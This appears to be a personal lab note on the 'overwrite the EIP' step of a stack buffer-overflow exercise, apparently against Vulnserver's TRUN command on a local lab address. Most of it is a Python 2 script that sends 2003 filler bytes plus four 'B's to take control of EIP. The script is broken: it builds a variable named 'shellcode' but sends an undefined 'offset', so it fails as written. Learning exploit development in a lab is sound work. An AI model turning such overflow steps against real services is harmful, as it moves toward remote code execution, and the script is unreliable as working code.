Overwrite the EIP

    Found at 2003 byes before the EIP and the EIP is 4 bytes long  

        Overwrites the EIP with B's not A's so that we know we got it right 

    #!/usr/bin/python 

    import sys, socket 

    from time import sleep 

      

    shellcode = "A" * 2003 + "B" * 4 

      

      

    try: 

            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

            s.connect(('10.0.2.4',9999)) 

            s.send(('TRUN /.:/' + offset)) 

            s.close() 

      

    except: 

            print "Error connecting to server " 

            sys.exit() 


![GetImage.png](../../_resources/6b3a62fe5745437f8e4fc1d525d1e601.png)


 